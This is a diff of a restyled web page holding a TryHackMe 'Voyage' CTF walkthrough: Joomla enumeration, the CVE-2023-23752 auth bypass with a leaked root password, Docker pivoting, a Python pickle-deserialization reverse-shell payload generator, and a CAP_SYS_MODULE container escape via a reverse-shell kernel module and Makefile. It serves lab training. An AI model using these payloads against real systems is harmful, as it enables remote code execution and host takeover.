@@ -3,67 +3,274 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Voyage CTF - TryHackMe Walkthrough | Omar Mesalam</title>
-    <link rel="stylesheet" href="../css/style.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <title>Voyage - CTF - TryHackMe Walkthrough | Omar Mesalam</title>
+    
+    <!-- Fonts & Icons -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500&family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
     <style>
+        :root {
+            --bg-dark: #12161f;
+            --card-bg: rgba(22, 28, 39, 0.85);
+            --border-color: rgba(255, 255, 255, 0.08);
+            --accent-green: #10b981;
+            --accent-glow: rgba(16, 185, 129, 0.15);
+            --text-main: #f1f5f9;
+            --text-sub: #94a3b8;
+            --font-code: 'Fira Code', monospace;
+            --font-sans: 'Inter', sans-serif;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            background-color: var(--bg-dark);
+            color: var(--text-main);
+            font-family: var(--font-sans);
+            line-height: 1.8;
+            padding-bottom: 60px;
+        }
+
+        .navbar {
+            border-bottom: 1px solid var(--border-color);
+            padding: 16px 0;
+            background: rgba(18, 22, 31, 0.9);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .nav-container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            font-family: var(--font-code);
+            font-weight: 700;
+            color: var(--text-main);
+            text-decoration: none;
+        }
+
+        .logo-accent { color: var(--accent-green); }
+
+        .back-btn {
+            color: var(--accent-green);
+            text-decoration: none;
+            font-family: var(--font-code);
+            font-size: 0.9rem;
+        }
+
+        .article-container {
+            max-width: 850px;
+            margin: 40px auto;
+            padding: 0 20px;
+        }
+
+        .article-box {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 40px;
+        }
+
+        .article-header {
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 20px;
+            margin-bottom: 30px;
+        }
+
+        .article-title {
+            font-size: 1.8rem;
+            font-weight: 700;
+            line-height: 1.3;
+            margin-bottom: 12px;
+        }
+
+        .article-meta {
+            font-size: 0.85rem;
+            color: var(--text-sub);
+            font-family: var(--font-code);
+            display: flex;
+            gap: 15px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        .badge { color: var(--accent-green); }
+
+        .impact-highlights {
+            background: rgba(16, 185, 129, 0.05);
+            border-left: 4px solid var(--accent-green);
+            padding: 15px 20px;
+            margin: 25px 0;
+            border-radius: 0 8px 8px 0;
+        }
+
+        .impact-highlights ul {
+            list-style: none;
+            margin: 0;
+            padding: 0;
+        }
+
+        .impact-highlights li {
+            font-family: var(--font-code);
+            font-size: 0.93rem;
+            color: #e2e8f0;
+            margin-bottom: 5px;
+        }
+
+        .impact-highlights li:last-child { margin-bottom: 0; }
+
+        .article-body h2 {
+            font-size: 1.3rem;
+            font-family: var(--font-code);
+            color: var(--accent-green);
+            margin: 35px 0 15px 0;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .article-body p {
+            color: #cbd5e1;
+            font-size: 0.98rem;
+            margin-bottom: 18px;
+        }
+
         .terminal-box {
             background: #0d1117;
-            border: 1px solid #30363d;
-            border-radius: 6px;
-            padding: 1rem;
-            font-family: monospace;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 15px 20px;
+            font-family: var(--font-code);
+            font-size: 0.88rem;
             color: #c9d1d9;
-            margin: 1rem 0;
+            margin: 20px 0;
             overflow-x: auto;
             white-space: pre-wrap;
             word-break: break-word;
         }
+
         .code-box {
             background: #161b22;
-            border: 1px solid #30363d;
-            border-radius: 6px;
-            padding: 1rem;
-            font-family: monospace;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 15px 20px;
+            font-family: var(--font-code);
+            font-size: 0.88rem;
             color: #79c0ff;
-            margin: 1rem 0;
+            margin: 20px 0;
             overflow-x: auto;
             white-space: pre;
         }
-        .writeup-text {
-            color: #d1d5db;
-            line-height: 1.7;
-            font-size: 1rem;
-            margin: 1rem 0;
+
+        .custom-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+            background: rgba(0, 0, 0, 0.2);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            overflow: hidden;
+            font-family: var(--font-code);
+            font-size: 0.88rem;
+        }
+
+        .custom-table th, .custom-table td {
+            padding: 12px 15px;
+            text-align: left;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .custom-table th {
+            background: rgba(16, 185, 129, 0.1);
+            color: var(--accent-green);
+        }
+
+        .custom-table td {
+            color: #cbd5e1;
+        }
+
+        .img-container {
+            margin: 25px 0;
+            text-align: center;
+            background: rgba(0, 0, 0, 0.2);
+            padding: 15px;
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+        }
+
+        .img-container img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 6px;
+        }
+
+        .conclusion-box {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid var(--border-color);
+            padding: 20px;
+            border-radius: 8px;
+            margin-top: 30px;
+        }
+
+        code {
+            font-family: var(--font-code);
+            background: rgba(255, 255, 255, 0.06);
+            padding: 2px 6px;
+            border-radius: 4px;
+            color: var(--accent-green);
+            font-size: 0.9em;
+        }
+
+        @media (max-width: 600px) {
+            .article-box { padding: 20px; }
+            .article-title { font-size: 1.4rem; }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <header style="margin-bottom: 2rem;">
-            <a href="../index.html" class="read-more" style="display: inline-flex; align-items: center; gap: 8px;">
-                <i class="fa-solid fa-arrow-left"></i> Back to Writeups
-            </a>
-        </header>
 
-        <main>
-            <article class="post-card" style="margin-bottom: 2rem;">
-                <div class="post-content">
-                    <div class="post-meta">
-                        <span class="post-date"><i class="fa-regular fa-calendar"></i> Aug 15, 2026</span>
-                        <span class="post-category"><i class="fa-solid fa-flag"></i> CTF Writeup</span>
-                    </div>
-                    <h1 class="post-title" style="font-size: 2rem; margin: 1rem 0;">Voyage - CTF - TryHackMe</h1>
-                    <div class="post-tags">
-                        <span class="tag">TryHackMe</span>
-                        <span class="tag">CTF</span>
-                        <span class="tag">Docker</span>
-                    </div>
+    <header class="navbar">
+        <div class="nav-container">
+            <a href="../index.html" class="logo"><span class="logo-accent">&gt;</span> Omar Mesalam_</a>
+            <a href="../index.html" class="back-btn">&larr; Back to Writeups</a>
+        </div>
+    </header>
+
+    <div class="article-container">
+        <article class="article-box">
+            
+            <header class="article-header">
+                <h1 class="article-title">Voyage - CTF - TryHackMe Walkthrough</h1>
+                <div class="article-meta">
+                    <span class="badge">Mesalam_17</span>
+                    <span>• TryHackMe</span>
+                    <span>• Aug 15, 2026</span>
+                    <span>• CTF Writeup</span>
                 </div>
-            </article>
 
-            <div class="writeup-content">
-                <p class="writeup-text">Now I have an IP address, I must first examine it to find out what services are available on it 10.67.166.123 Then i use nmap to do this step</p>
+                <div class="impact-highlights">
+                    <ul>
+                        <li>— TryHackMe Docker Escape</li>
+                        <li>— Python Deserialization</li>
+                        <li>— CAP_SYS_MODULE Privilege Escalation</li>
+                    </ul>
+                </div>
+            </header>
+
+            <div class="article-body">
+                
+                <h2>1. Reconnaissance & Enumeration 🔍</h2>
+                <p>Now I have an IP address, I must first examine it to find out what services are available on it.<br>10.67.166.123<br>Then i use nmap to do this step</p>
 
                 <div class="terminal-box">┌──(root㉿omar)-[/home/mesalam/Downloads]
 └─# nmap -Pn -sS -sV -O -sC 10.67.166.123
@@ -108,128 +315,181 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 42.25 seconds</div>
 
-                <p class="writeup-text">we now have a nice information to start the attacks<br>now lets open Burpsuite to record everything while we open http<br>But after that we need to run some enumerations for this port<br>The First Thing :<br><code>gobuster dir -u http://10.67.166.123 -w /usr/share/seclists/Discovery/Web-Content/common.txt</code><br>The second :<br><code>dirsearch -u http://10.67.166.123 -e conf, config, bak, backup, swp, old, db, sql, asp, aspx, py, rb, php, bak, bhp, cache, cgi, conf, csv, html, inc, jar, js, json, jsp, lock, log, rar, old, sql, sql.gz, sql.zip, tar.gz, swp, tar, tar.bz2, tar.gz, txt, wadl, zip, log, xml, js, json</code><br>and i use it to understand the website</p>
+                <p>we now have a nice information to start the attacks<br>now lets open Burpsuite to record everything while we open http<br>But after that we need to run some enumerations for this port<br>The First Thing :<br><code>gobuster dir -u http://10.67.166.123 -w /usr/share/seclists/Discovery/Web-Content/common.txt</code><br>The second :<br><code>dirsearch -u http://10.67.166.123 -e conf, config, bak, backup, swp, old, db, sql, asp, aspx, py, rb, php, bak, bhp, cache, cgi, conf, csv, html, inc, jar, js, json, jsp, lock, log, rar, old, sql, sql.gz, sql.zip, tar.gz, swp, tar, tar.bz2, tar.gz, txt, wadl, zip, log, xml, js, json</code><br>and i use it to understand the website</p>
 
                 <div class="terminal-box">┌──(root㉿omar)-[/home/mesalam/Downloads]
 
 └─# whatweb http://10.67.166.123
 http://10.67.166.123 [200 OK] Apache[2.4.58], Cookies[310c29008fc04f792e0bccb4682e5b78], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], HttpOnly[310c29008fc04f792e0bccb4682e5b78], IP[10.67.166.123], MetaGenerator[Joomla! - Open Source Content Management], PasswordField[password], Script[application/json,application/ld+json,module], Title[Home], UncommonHeaders[referrer-policy,cross-origin-opener-policy], X-Frame-Options[SAMEORIGIN]</div>
 
-                <p class="writeup-text">now iam sure the website use joomla.<br>now i opened the website and show the source code but no thing interesting<br>i will use burp now and testing the main page that is login page<br>i do some config to make it easy<br><br>While i do it i notice some Enum is finished<br>and we have interesing directores and paths</p>
+                <p>now iam sure the website use joomla.<br>now i opened the website and show the source code but no thing interesting<br>i will use burp now and testing the main page that is login page<br>i do some config to make it easy<br><br>While i do it i notice some Enum is finished<br>and we have interesing directores and paths</p>
 
                 <div class="terminal-box">┌──(root㉿omar)-[/home/mesalam/Downloads]
 
 └─# dirsearch -u http://10.67.166.123 -e conf, config, bak, backup, swp, old, db, sql, asp, aspx, py, rb, php, bak, bhp, cache, cgi, conf, csv, html, inc, jar, js, json, jsp, lock, log, rar, old, sql, sql.gz, sql.zip, tar.gz, swp, tar, tar.bz2, tar.gz, txt, wadl, zip, log, xml, js, json
 /administrator/cache/
+
 /administrator/includes/
+
 /administrator/logs/
+
 /administrator/
+
 /cache/
+
 /cli/
+
 /components/
+
 /configuration.php
+
 /htaccess.txt
+
 /images/
+
 /includes/
+
 /index.php
+
 /layouts/
+
 /LICENSE.txt
+
 /media/
+
 /modules/
+
 /plugins/
+
 /README.txt
+
 /robots.txt
+
 /templates/
+
 /templates/index.html
+
 /templates/system/
+
 /tmp/
+
 /web.config.txt</div>
 
-                <p class="writeup-text">Lets testing it<br>The first intesresting Find :<br><code>/administrator/includes/</code><br><br>The second find it was this —&gt; http://10.67.166.123/administrator/<br>it redirect me to admin page login<br><br>Ohoo interesting finding again<br>http://10.67.166.123/htaccess.txt<br>I think it maybe include the version of joomla<br><br>It is will be useful too<br>http://10.67.166.123/robots.txt</p>
+                <p>Lets testing it<br>The first intesresting Find :<br><code>/administrator/includes/</code><br><br>The second find it was this —&gt; http://10.67.166.123/administrator/<br>it redirect me to admin page login<br><br>Ohoo interesting finding again<br>http://10.67.166.123/htaccess.txt<br>I think it maybe include the version of joomla<br><br>It is will be useful too<br>http://10.67.166.123/robots.txt</p>
 
                 <div class="terminal-box">User-agent: *
+
 Disallow: /administrator/
+
 Disallow: /api/
+
 Disallow: /bin/
+
 Disallow: /cache/
+
 Disallow: /cli/
+
 Disallow: /components/
+
 Disallow: /includes/
+
 Disallow: /installation/
+
 Disallow: /language/
+
 Disallow: /layouts/
+
 Disallow: /libraries/
+
 Disallow: /logs/
+
 Disallow: /modules/
+
 Disallow: /plugins/
+
 Disallow: /tmp/</div>
 
-                <p class="writeup-text">Now we finish the directories that we accessed from eum<br>but we dont know the version<br>I will do something i hope to be useful<br><br>Some times i like Ai 😂<br>this path was include the version and it was Joomla 4.2.7 2023-01<br>I think it is very old .<br>Now i will install joomscan<br>its tool for joomla websites</p>
+                <p>Now we finish the directories that we accessed from eum<br>but we dont know the version<br>I will do something i hope to be useful<br><br>Some times i like Ai 😂<br>this path was include the version and it was Joomla 4.2.7 2023-01<br>I think it is very old .<br>Now i will install joomscan<br>its tool for joomla websites</p>
 
                 <div class="terminal-box">[+] Detecting Joomla Version
+
 [++] Joomla 4.2.7</div>
 
-                <p class="writeup-text">The tool brof that again<br>will the tool finish i will search about cves<br>I found CVE-2023-23752: Joomla Authentication Bypass<br>https://github.com/K3ysTr0K3R/CVE-2023-23752-EXPLOIT<br>https://github.com/K3ysTr0K3R/CVE-2023-23752-EXPLOIT<br><br>Now we obtain credentials but this cred doesnt work on port 22<br>but if try on 2222 it success RootPassword@1234<br>22 → failed<br>2222 → successful<br><br>But i think iam on Docker container<br><br>Now this Confirms that we are in docker</p>
+                <p>The tool brof that again<br>will the tool finish i will search about cves<br>I found CVE-2023-23752: Joomla Authentication Bypass<br>https://github.com/K3ysTr0K3R/CVE-2023-23752-EXPLOIT<br>https://github.com/K3ysTr0K3R/CVE-2023-23752-EXPLOIT<br><br>Now we obtain credentials but this cred doesnt work on port 22<br>but if try on 2222 it success RootPassword@1234<br>22 → failed<br><br>2222 → successful<br><br>But i think iam on Docker container<br><br>Now this Confirms that we are in docker</p>
 
                 <div class="terminal-box">root@f5eb774507f2:/# id
+
 uid=0(root) gid=0(root) groups=0(root)
 
 root@f5eb774507f2:/# hostname
+
 f5eb774507f2
 
 root@f5eb774507f2:/# hostname
+
 f5eb774507f2
 
 root@f5eb774507f2:/# cat /proc/1/cgroup
+
 0::/</div>
 
-                <p class="writeup-text">Now we need to discover the Network<br>Then i do ip a</p>
+                <h2>2. Internal Pivot & Network Discovery 🌐</h2>
+                <p>Now we need to discover the Network<br>Then i do ip a</p>
 
                 <div class="terminal-box">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+
 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+
 inet 127.0.0.1/8 scope host lo
+
 valid_lft forever preferred_lft forever
+
 inet6 ::1/128 scope host
+
 valid_lft forever preferred_lft forever
+
 8: eth0@if9: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default
+
 link/ether 02:42:c0:a8:64:0a brd ff:ff:ff:ff:ff:ff link-netnsid 0
+
 inet 192.168.100.10/24 brd 192.168.100.255 scope global eth0
+
 valid_lft forever preferred_lft forever</div>
 
-                <p class="writeup-text">inet 192.168.100.10/24 —→ Thats The important<br>now we will discover it<br><code>nmap -Pn -p- -sV 192.168.100.0-255</code></p>
+                <p>inet 192.168.100.10/24 —→ Thats The important<br>now we will discover it<br><code>nmap -Pn -p- -sV 192.168.100.0-255</code></p>
 
-                <table style="width: 100%; border-collapse: collapse; margin: 1rem 0; background: #111827; border: 1px solid #1f2937;">
+                <table class="custom-table">
                     <thead>
-                        <tr style="border-bottom: 1px solid #1f2937; color: #10b981; text-align: left;">
-                            <th style="padding: 0.5rem;">IP</th>
-                            <th style="padding: 0.5rem;">Role</th>
-                            <th style="padding: 0.5rem;">Open Ports</th>
-                            <th style="padding: 0.5rem;">Details</th>
+                        <tr>
+                            <th>IP</th>
+                            <th>Role</th>
+                            <th>Open Ports</th>
+                            <th>Details</th>
                         </tr>
                     </thead>
                     <tbody>
-                        <tr style="border-bottom: 1px solid #1f2937;">
-                            <td style="padding: 0.5rem;">192.168.100.1</td>
-                            <td style="padding: 0.5rem;">Host / Main Server</td>
-                            <td style="padding: 0.5rem;">22, 80, 2222, 5000</td>
-                            <td style="padding: 0.5rem;">Apache + SSH + another service</td>
-                        </tr>
-                        <tr style="border-bottom: 1px solid #1f2937;">
-                            <td style="padding: 0.5rem;">192.168.100.10</td>
-                            <td style="padding: 0.5rem;">Current Container</td>
-                            <td style="padding: 0.5rem;">22</td>
-                            <td style="padding: 0.5rem;">Ubuntu 20.04, OpenSSH 8.2</td>
+                        <tr>
+                            <td>192.168.100.1</td>
+                            <td>Host / Main Server</td>
+                            <td>22, 80, 2222, 5000</td>
+                            <td>Apache + SSH + another service</td>
                         </tr>
                         <tr>
-                            <td style="padding: 0.5rem;">192.168.100.12</td>
-                            <td style="padding: 0.5rem;">Internal Host/Container</td>
-                            <td style="padding: 0.5rem;">5000</td>
-                            <td style="padding: 0.5rem;">Python Flask/Werkzeug application</td>
+                            <td>192.168.100.10</td>
+                            <td>Current Container</td>
+                            <td>22</td>
+                            <td>Ubuntu 20.04, OpenSSH 8.2</td>
+                        </tr>
+                        <tr>
+                            <td>192.168.100.12</td>
+                            <td>Internal Host/Container</td>
+                            <td>5000</td>
+                            <td>Python Flask/Werkzeug application</td>
                         </tr>
                     </tbody>
                 </table>
 
-                <p class="writeup-text">The interesting discovery it was it<br>192.168.100.12:5000<br>Werkzeug/3.1.3<br>Python/3.10.12<br>now we need discover it<br><code>curl -i http://192.168.100.12:5000/</code><br>it make us to know this port is<br>Flask login panel<br>accept post method on / path<br>the unexpected thing heppened that it was the website doesnt validate the credentials<br>The Flask application was only accessible from the internal network so I decided to use SSH local port forwarding to access it from my machine and inspect the requests through Burp Suite<br>i made it and login with test test<br><br>then i think we need to show the req<br>we found it<br><code>session_data=80049525000000000000007d94288c0475736572948c0474657374948c07726576656e7565948c05383530303094752e</code><br>ummm i think i will try to use Ai to analysis it<br><br>Thats interesting<br>If we can prove that the application uses pickle.loads() to deserialize this cookie, I think we can potentially get RCE.<br>Now we prove it<br><br>then i use this script to generate a payload for reverse shell</p>
+                <p>The interesting discovery it was it<br>192.168.100.12:5000<br>Werkzeug/3.1.3<br><br>Python/3.10.12<br>now we need discover it<br><code>curl -i http://192.168.100.12:5000/</code><br>it make us to know this port is<br>Flask login panel<br>accept post method on / path<br>the unexpected thing heppened that it was the website doesnt validate the credentials<br>The Flask application was only accessible from the internal network so I decided to use SSH local port forwarding to access it from my machine and inspect the requests through Burp Suite<br>i made it and login with test test<br><br>then i think we need to show the req<br>we found it<br><code>session_data=80049525000000000000007d94288c0475736572948c0474657374948c07726576656e7565948c05383530303094752e</code><br>ummm i think i will try to use Ai to analysis it<br><br>Thats interesting<br>If we can prove that the application uses pickle.loads() to deserialize this cookie, I think we can potentially get RCE.<br>Now we prove it<br><br>then i use this script to generate a payload for reverse shell</p>
 
                 <div class="code-box">import pickle
 import os
@@ -242,14 +502,17 @@ class exploit(object):
 if __name__ == '__main__':
     print(binascii.hexlify(pickle.dumps(exploit())))</div>
 
-                <p class="writeup-text">This generate a new cookie that have the payload inside<br>and i open shell to receive it<br><br>that give me another shell But it put me in another Contain Docker<br><br>I set up the connection like this</p>
+                <p>This generate a new cookie that have the payload inside<br>and i open shell to receive it<br><br>that give me another shell But it put me in another Contain Docker<br><br>I set up the connection like this</p>
 
                 <div class="terminal-box">script /dev/null -c bash
 stty raw -echo; fg
 reset
 xterm</div>
 
-                <p class="writeup-text">TTY / shell stabilization<br>Then i find the First Flag<br><br>Now we need to perform privilege escalation<br>Then I transferred LinPEAS to the container and executed it to enumerate potential privilege escalation<br>LinPEAS identified container/kernel-related security weaknesses including the presence of the host-relevant /proc interface and the CAP_SYS_MODULE capability.<br>The second important finding was that the container had the CAP_SYS_MODULE capability enabled.<br>This capability allowed us to load a kernel module into the running kernel<br>Now we need to do container escapescape<br>I used a reverse shell kernel module template from HackTricks and modified it to point to my attack machine</p>
+                <p>TTY / shell stabilization<br>Then i find the First Flag</p>
+
+                <h2>3. Container Escape & Privilege Escalation ⚡</h2>
+                <p>Now we need to perform privilege escalation<br>Then I transferred LinPEAS to the container and executed it to enumerate potential privilege escalation<br>LinPEAS identified container/kernel-related security weaknesses including the presence of the host-relevant /proc interface and the CAP_SYS_MODULE capability.<br>The second important finding was that the container had the CAP_SYS_MODULE capability enabled.<br>This capability allowed us to load a kernel module into the running kernel<br>Now we need to do container escapescape<br>I used a reverse shell kernel module template from HackTricks and modified it to point to my attack machine</p>
 
                 <div class="code-box">#include &lt;linux/kmod.h&gt;
 #include &lt;linux/module.h&gt;
@@ -273,7 +536,7 @@ static void __exit reverse_shell_exit(void) {
 module_init(reverse_shell_init);
 module_exit(reverse_shell_exit);</div>
 
-                <p class="writeup-text">Now we need to know the kernel<br><code>uname -r</code><br>6.8.0-1031-aws<br>Then look at the module headers that are available<br><code>ls -la /lib/modules/</code><br>Now we need to makefile<br>now i notice that kerner header 1030 is available and 1031 is running<br>so we will target 1030 For your information, this is not a general rule.<br><code>nano Makefile</code></p>
+                <p>Now we need to know the kernel<br><code>uname -r</code><br>6.8.0-1031-aws<br>Then look at the module headers that are available<br><code>ls -la /lib/modules/</code><br>Now we need to makefile<br>now i notice that kerner header 1030 is available and 1031 is running<br>so we will target 1030 For your information, this is not a general rule.<br><code>nano Makefile</code></p>
 
                 <div class="code-box">obj-m += rev.o
 KDIR := /lib/modules/6.8.0-1030-aws/build
@@ -283,9 +546,19 @@ all:
 clean:
 	make -C $(KDIR) M=$(PWD) clean</div>
 
-                <p class="writeup-text"><code>make</code><br>now we have output rev.ko<br>I set up another listener on my machine and loaded the module.<br><br>Now the module executed immediately giving me a reverse shell on the host machine.<br>Now I had successfully escaped the container and obtained root access</p>
+                <p><code>make</code><br>now we have output rev.ko<br>I set up another listener on my machine and loaded the module.</p>
+
+                <div class="conclusion-box">
+                    <p style="margin: 0; color: var(--accent-green); font-weight: bold; font-family: var(--font-code);">Root Access Granted 🔥</p>
+                    <p style="margin-top: 10px; color: #cbd5e1;">Now the module executed immediately giving me a reverse shell on the host machine.<br>Now I had successfully escaped the container and obtained root access</p>
+                </div>
+
+                <p style="margin-top: 30px; font-weight: bold; font-family: var(--font-code); color: var(--accent-green);">Bye 👋</p>
+
             </div>
-        </main>
+
+        </article>
     </div>
+
 </body>
 </html>
